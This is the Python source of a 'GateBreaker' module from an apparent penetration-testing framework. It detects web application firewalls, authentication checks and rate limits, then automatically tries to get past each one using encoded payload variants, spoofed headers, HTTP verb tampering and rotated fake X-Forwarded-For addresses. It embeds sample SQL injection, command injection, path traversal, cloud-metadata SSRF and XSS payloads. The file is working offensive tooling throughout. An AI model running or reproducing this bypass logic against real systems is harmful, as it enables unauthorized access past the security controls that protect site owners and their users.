#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - GateBreaker Module

Unified "gate-breaking" scan mode for authorized penetration testing.

A *gate* is any protective control that stands between the scanner and the
application logic behind it. GateBreaker recognises three classes of gate:

    * WAF gate         - a web application firewall / signature filter that
                         blocks obviously-malicious payloads.
    * Authentication   - an authn/authz boundary that returns 401/403 for
      gate               unauthenticated or unauthorised requests.
    * Rate-limit gate  - a throttle that returns 429 once a request burst
                         exceeds the allowed rate.

GateBreaker does **not** invent new offensive capabilities. It is pure
*orchestration*: when a gate is detected it drives the framework's existing
:class:`core.bypass.BypassOrchestrator` ladder (URL/double-URL/HTML/Unicode
encoders, mixed case, whitespace swap, SQL comment splitting, IP spoofing,
origin spoofing, verb tampering, jitter, ...) against that gate and reports
which gates it managed to break and with which rung.

The orchestrator's per-host learning ledger is updated as we go
(``record_success`` / ``record_failure``) so subsequent targets benefit from
techniques that already worked on this host.

Design notes:
    * Defensive throughout: ``requester.request`` may return ``None`` and
      every loop is bounded.
    * Reuses ``config.Payloads`` pools for the malicious probes.
    * Works standalone: if ``engine.bypass`` is ``None`` (the orchestrator was
      never built because neither ``--full-bypass`` nor ``--waf-bypass`` was
      set), GateBreaker builds a local orchestrator via
      ``core.bypass.build_orchestrator`` so the module is useful on its own.
"""
from __future__ import annotations

import time
from urllib.parse import quote, urlparse

from config import Payloads
from modules.base import BaseModule


class GateBreakerModule(BaseModule):
    """Detect protective gates and orchestrate bypass of each one."""

    name = "GateBreaker"
    vuln_type = "gatebreaker"

    # ---- tuning knobs (all bounded) ----------------------------------
    _MAX_WAF_VARIANTS = 8        # max bypass rungs tried per WAF gate
    _MAX_AUTH_VARIANTS = 8       # max header/verb rungs tried per auth gate
    _BURST = 12                  # requests per rate-limit burst (10-20 range)
    _MAX_DELAY = 1.6             # cap on per-request jitter (seconds)
    _MIN_BODY = 16               # min body length to count a response as "data"

    _BENIGN_VALUE = "atomic_benign_probe"

    _WAF_BLOCK_STATUS = (403, 406, 429, 501)

    # Body fragments commonly emitted by WAF/CDN block pages.
    _WAF_BODY_SIGNATURES = (
        "access denied", "blocked by", "security policy", "request blocked",
        "firewall", "waf", "cloudflare", "sucuri", "incapsula", "akamai",
        "f5 big-ip", "mod_security", "modsecurity", "not acceptable",
        "forbidden by", "malicious", "attack detected",
    )

    # Body fragments that indicate an authentication / authorization boundary.
    _AUTH_BODY_SIGNATURES = (
        "unauthorized", "unauthenticated", "authentication required",
        "login required", "please log in", "must be logged in",
        "invalid token", "missing token", "expired token", "no token",
        "permission denied", "not authorized", "access token", "forbidden",
        "401", "403 forbidden", "sign in",
    )

    # Backend error signatures: their presence means the payload slipped past
    # the gate and reached application logic (a successful bypass even on 5xx).
    _BACKEND_ERROR_SIGNATURES = (
        "sql syntax", "mysql", "postgresql", "sqlite", "ora-",
        "unclosed quotation", "syntax error", "unexpected token",
        "stack trace", "traceback", "exception", "fatal error",
        "warning:", "undefined index", "internal server error",
    )

    def __init__(self, engine):
        super().__init__(engine)
        self._local_orchestrator = None
        self._gates: list[dict] = []
        self._processed: set = set()

    # ------------------------------------------------------------------
    # Public entry points
    # ------------------------------------------------------------------
    def test(self, url, method, param, value):
        """Parameter-aware gate breaking."""
        self._run_gatebreaker(url, method or "GET", param or "q", value or self._BENIGN_VALUE)

    def test_url(self, url):
        """URL-level gate breaking (no specific parameter)."""
        self._run_gatebreaker(url, "GET", "q", self._BENIGN_VALUE)

    def get_gate_report(self) -> list[dict]:
        """Return the structured gates list from the most recent run.

        Each entry is a dict::

            {"type": "waf"|"auth"|"rate_limit",
             "detected": bool,
             "broken": bool,
             "technique": str | None,
             "evidence": str}
        """
        return list(self._gates)

    # ------------------------------------------------------------------
    # Orchestration core
    # ------------------------------------------------------------------
    def _run_gatebreaker(self, url, method, param, value):
        """Detect and attempt to break all three gate classes for *url*."""
        key = (url, method, param)
        if key in self._processed:
            return self._gates
        self._processed.add(key)

        host = self._host(url)

        gates = [
            self._detect_and_break_waf(url, method, param, value, host),
            self._detect_and_break_auth(url, method, param, value, host),
            self._detect_and_break_rate_limit(url, method, host),
        ]
        self._gates = gates

        # Emit a finding for every gate we actually broke.
        for gate in gates:
            if gate.get("broken"):
                self._emit_gate_finding(url, method, param, gate)

        self._print_summary(gates)
        return gates

    # ------------------------------------------------------------------
    # WAF gate
    # ------------------------------------------------------------------
    def _detect_and_break_waf(self, url, method, param, value, host):
        """Detect a WAF gate and try to break it via the bypass ladder."""
        gate = {"type": "waf", "detected": False, "broken": False,
                "technique": None, "evidence": ""}

        family, malicious = self._guess_family_and_payload(param, value)

        benign = self._send(url, method, param, self._BENIGN_VALUE)
        malicious_resp = self._send(url, method, param, malicious)

        benign_ok = (benign is not None and benign.status_code == 200
                     and not self._is_waf_blocked(benign))
        malicious_blocked = self._is_waf_blocked(malicious_resp)

        if not (benign_ok and malicious_blocked):
            return gate

        block_status = malicious_resp.status_code
        gate["detected"] = True
        gate["evidence"] = (
            f"Benign probe -> {benign.status_code}; malicious probe "
            f"('{malicious[:40]}') -> {block_status} (gate present)"
        )

        orch = self._get_orchestrator()
        if orch is None:
            return gate

        tried = 0
        for attempt in orch.payload_variants(malicious, family=family, host=host):
            # Skip the baseline / no-op rung: we already know the raw
            # malicious payload is blocked (that's how we detected the gate).
            if attempt.payload is None or attempt.payload == malicious:
                continue
            if tried >= self._MAX_WAF_VARIANTS:
                break
            tried += 1

            resp = self._send(
                url, method, param, attempt.payload,
                headers=attempt.extra_headers,
                method_override=attempt.method_override,
            )
            if self._reached_backend(resp):
                orch.record_success(host, attempt.rung)
                gate["broken"] = True
                gate["technique"] = attempt.rung
                gate["evidence"] = (
                    f"Malicious probe blocked ({block_status}); variant "
                    f"'{attempt.rung}' returned {resp.status_code} - WAF gate broken"
                )
                break
            orch.record_failure(host, attempt.rung)

        return gate

    # ------------------------------------------------------------------
    # Authentication gate
    # ------------------------------------------------------------------
    def _detect_and_break_auth(self, url, method, param, value, host):
        """Detect an authn/authz gate and try to break it via header/verb rungs."""
        gate = {"type": "auth", "detected": False, "broken": False,
                "technique": None, "evidence": ""}

        baseline = self._send(url, method, param, value)
        if not self._looks_auth_protected(baseline):
            return gate

        gate["detected"] = True
        gate["evidence"] = (
            f"Protected resource returned {baseline.status_code} "
            f"for an ordinary request (auth gate present)"
        )

        orch = self._get_orchestrator()
        if orch is None:
            return gate

        tried = 0
        for attempt in orch.payload_variants(value or "", family="auth", host=host):
            # Auth bypass relies on spoofed headers / verb tampering, never
            # on payload mutation - skip rungs that only touch the payload.
            if not attempt.extra_headers and not attempt.method_override:
                continue
            if tried >= self._MAX_AUTH_VARIANTS:
                break
            tried += 1

            resp = self._send(
                url, method, param, value,
                headers=attempt.extra_headers,
                method_override=attempt.method_override,
            )
            if self._auth_accessible(resp):
                orch.record_success(host, attempt.rung)
                gate["broken"] = True
                gate["technique"] = attempt.rung
                gate["evidence"] = (
                    f"Ordinary request blocked ({baseline.status_code}); rung "
                    f"'{attempt.rung}' returned 200 with {len(resp.text or '')} "
                    f"bytes of data - auth gate broken"
                )
                break
            orch.record_failure(host, attempt.rung)

        return gate

    # ------------------------------------------------------------------
    # Rate-limit gate
    # ------------------------------------------------------------------
    def _detect_and_break_rate_limit(self, url, method, host):
        """Detect a rate-limit gate and try to bypass it via IP rotation + jitter."""
        gate = {"type": "rate_limit", "detected": False, "broken": False,
                "technique": None, "evidence": ""}

        # Detection: a short rapid burst. A 429 anywhere means a gate is present.
        sent = 0
        for _ in range(self._BURST):
            resp = self._send(url, method, None, None)
            if resp is None:
                # No response stream - cannot reliably test rate limiting.
                if sent == 0:
                    return gate
                break
            sent += 1
            if resp.status_code == 429:
                gate["detected"] = True
                gate["evidence"] = (
                    f"Received HTTP 429 after {sent} rapid requests "
                    f"(rate-limit gate present)"
                )
                break

        if not gate["detected"]:
            return gate

        # Bypass: replay the burst, rotating spoofed source IPs per request and
        # honouring the orchestrator's jitter rung. If no 429 reappears, the
        # throttle has been evaded.
        orch = self._get_orchestrator()
        base_headers: dict = {}
        delay = 0.0
        rung = "ip_spoof_xff"
        if orch is not None:
            for attempt in orch.payload_variants("", family="rate_limit", host=host):
                if attempt.extra_headers:
                    base_headers.update(attempt.extra_headers)
                if attempt.delay_seconds:
                    delay = max(delay, attempt.delay_seconds)

        bypassed = True
        rotated = 0
        for i in range(self._BURST):
            headers = dict(base_headers)
            spoof_ip = self._rotated_ip(i)
            headers["X-Forwarded-For"] = spoof_ip
            headers["X-Real-IP"] = spoof_ip
            if delay:
                self._sleep(min(delay, self._MAX_DELAY))
            resp = self._send(url, method, None, None, headers=headers)
            rotated += 1
            if resp is not None and resp.status_code == 429:
                bypassed = False
                break

        if bypassed:
            if orch is not None:
                orch.record_success(host, rung)
            gate["broken"] = True
            gate["technique"] = rung
            gate["evidence"] = (
                f"Replayed {rotated} requests with rotated X-Forwarded-For "
                f"and jitter - no 429 observed, rate-limit gate bypassed"
            )
        elif orch is not None:
            orch.record_failure(host, rung)

        return gate

    # ------------------------------------------------------------------
    # Findings + summary
    # ------------------------------------------------------------------
    _SEVERITY = {"waf": "HIGH", "auth": "HIGH", "rate_limit": "MEDIUM"}
    _LABEL = {"waf": "WAF", "auth": "auth", "rate_limit": "rate-limit"}

    def _emit_gate_finding(self, url, method, param, gate):
        gtype = gate["type"]
        label = self._LABEL.get(gtype, gtype)
        technique = gate.get("technique") or "unknown"
        self._add_finding(
            technique=f"GateBreaker: {label} gate bypassed ({technique})",
            url=url,
            method=method,
            param=param or "",
            payload=technique,
            evidence=gate.get("evidence", ""),
            severity=self._SEVERITY.get(gtype, "MEDIUM"),
            confidence="MEDIUM",
        )

    def _print_summary(self, gates):
        if self.config.get("quiet"):
            return
        broken = [g for g in gates if g.get("broken")]
        parts = [
            f"{self._LABEL.get(g['type'], g['type'])} via {g.get('technique')}"
            for g in broken
        ]
        msg = f"GateBreaker: {len(broken)}/{len(gates)} gates broken"
        if parts:
            msg += " (" + ", ".join(parts) + ")"
        self._log(msg)

    def _log(self, msg):
        """Print a line of output (kept separate so tests can silence it)."""
        try:
            from config import Colors
            print(Colors.warning(msg) if hasattr(Colors, "warning") else msg)
        except Exception:
            print(msg)

    # ------------------------------------------------------------------
    # Request helpers
    # ------------------------------------------------------------------
    def _send(self, url, method, param, value, headers=None, method_override=None):
        """Send one probe, returning the response or ``None``.

        For GET the *value* is injected into the query string; for POST it is
        sent as form data. ``param``/``value`` of ``None`` send the URL as-is
        (used by the rate-limit bursts).
        """
        req_method = (method_override or method or "GET").upper()
        try:
            if param is not None and value is not None:
                if req_method == "GET":
                    target = self._build_probe_url(url, param, value)
                    return self.requester.request(target, "GET", headers=headers or None)
                return self.requester.request(
                    url, req_method, data={param: value}, headers=headers or None
                )
            return self.requester.request(url, req_method, headers=headers or None)
        except Exception:
            # A misbehaving requester / transport must never crash the scan.
            return None

    @staticmethod
    def _build_probe_url(url, param, value):
        """Append ``param=value`` to *url*'s query string.

        ``safe='%'`` preserves any percent-encoding the bypass rung already
        applied (so ``double_url_encode`` output is not re-encoded) while still
        encoding raw special characters in the baseline payload.
        """
        encoded = quote(str(value), safe="%")
        parsed = urlparse(url)
        sep = "&" if parsed.query else "?"
        return f"{url}{sep}{param}={encoded}"

    @staticmethod
    def _rotated_ip(i):
        """Deterministic-but-varied spoofed source IP for burst rotation."""
        return f"10.{(i * 7) % 254 + 1}.{(i * 13) % 254 + 1}.{(i * 29) % 254 + 1}"

    def _sleep(self, seconds):
        """Wrapper around ``time.sleep`` (patched out in unit tests)."""
        if seconds and seconds > 0:
            time.sleep(seconds)

    # ------------------------------------------------------------------
    # Classification helpers
    # ------------------------------------------------------------------
    def _is_waf_blocked(self, resp):
        if resp is None:
            return False
        if resp.status_code in self._WAF_BLOCK_STATUS:
            return True
        body = (getattr(resp, "text", "") or "").lower()
        return any(sig in body for sig in self._WAF_BODY_SIGNATURES)

    def _reached_backend(self, resp):
        """True when a response indicates the payload slipped past the WAF."""
        if resp is None or self._is_waf_blocked(resp):
            return False
        if 200 <= resp.status_code < 400:
            return True
        body = (getattr(resp, "text", "") or "").lower()
        return any(sig in body for sig in self._BACKEND_ERROR_SIGNATURES)

    def _looks_auth_protected(self, resp):
        if resp is None:
            return False
        if resp.status_code == 401:
            return True
        if resp.status_code == 403:
            body = (getattr(resp, "text", "") or "").lower()
            if any(sig in body for sig in self._AUTH_BODY_SIGNATURES):
                return True
            # A bare 403 with no WAF signature is most likely an authz denial
            # rather than a firewall block.
            if not any(sig in body for sig in self._WAF_BODY_SIGNATURES):
                return True
        return False

    def _auth_accessible(self, resp):
        """True when a previously-protected resource now returns real data."""
        if resp is None or resp.status_code != 200:
            return False
        body = getattr(resp, "text", "") or ""
        if len(body) < self._MIN_BODY:
            return False
        low = body.lower()
        if any(sig in low for sig in self._AUTH_BODY_SIGNATURES):
            return False
        return True

    # ------------------------------------------------------------------
    # Misc helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _host(url):
        try:
            return urlparse(url).hostname
        except Exception:
            return None

    def _get_orchestrator(self):
        """Return the shared bypass orchestrator, building a local one if needed."""
        orch = getattr(self.engine, "bypass", None)
        if orch is not None:
            return orch
        if self._local_orchestrator is None:
            try:
                from core.bypass import build_orchestrator
                self._local_orchestrator = build_orchestrator(self.config)
            except Exception:
                self._local_orchestrator = None
        return self._local_orchestrator

    def _guess_family_and_payload(self, param, value):
        """Pick a bypass family + a representative malicious probe for *param*.

        Reuses ``config.Payloads`` pools so GateBreaker probes with the same
        payloads the rest of the framework already ships.
        """
        p = (param or "").lower()

        def first(pool, fallback):
            try:
                items = getattr(Payloads, pool, None)
                if items:
                    return items[0]
            except Exception:
                pass
            return fallback

        if any(k in p for k in ("id", "user", "name", "email", "search",
                                "query", "q", "filter", "sort", "order")):
            return "sqli", first("SQLI_ERROR_BASED", "' OR 1=1 -- -")
        if any(k in p for k in ("url", "redirect", "next", "link", "dest",
                                "return", "callback", "uri", "site")):
            return "ssrf", "http://169.254.169.254/latest/meta-data/"
        if any(k in p for k in ("cmd", "exec", "command", "run", "ping", "host")):
            return "cmdi", first("CMDI_PAYLOADS", "; id")
        if any(k in p for k in ("file", "path", "page", "include",
                                "template", "doc", "load", "dir")):
            return "lfi", "../../../../etc/passwd"
        return "xss", first("XSS_PAYLOADS", "<script>alert(1)</script>")
